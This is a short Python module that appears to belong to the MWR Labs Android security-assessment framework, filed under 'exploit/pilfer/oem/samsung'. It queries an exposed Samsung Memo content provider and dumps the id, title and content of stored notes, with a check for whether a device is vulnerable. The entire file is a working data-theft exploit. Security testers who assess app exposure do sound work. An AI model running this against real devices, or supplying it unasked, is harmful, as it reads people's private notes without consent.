from mwr.droidhg.modules import common, Module

class Memo(Module, common.Provider, common.TableFormatter, common.Vulnerability):

    name = "Tests for Content Provider vulnerability in com.sec.android.app.memo."
    description = "Tests for Content Provider vulnerability in com.sec.android.app.memo."
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "oem", "samsung"]

    label = "Note entries from Memo (com.sec.android.app.memo)"
    
    def exploit(self, arguments):
        c = self.getCursor()
        
        if c != None:
            rows = self.getResultSet(c)

            self.print_table(rows, show_headers=True)
        else:
            self.stdout.write("Unknown Error.\n")

    def getCursor(self):
        return self.contentResolver().query("content://com.samsung.sec.android/memo/all", projection=["_id", "title", "content"])

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
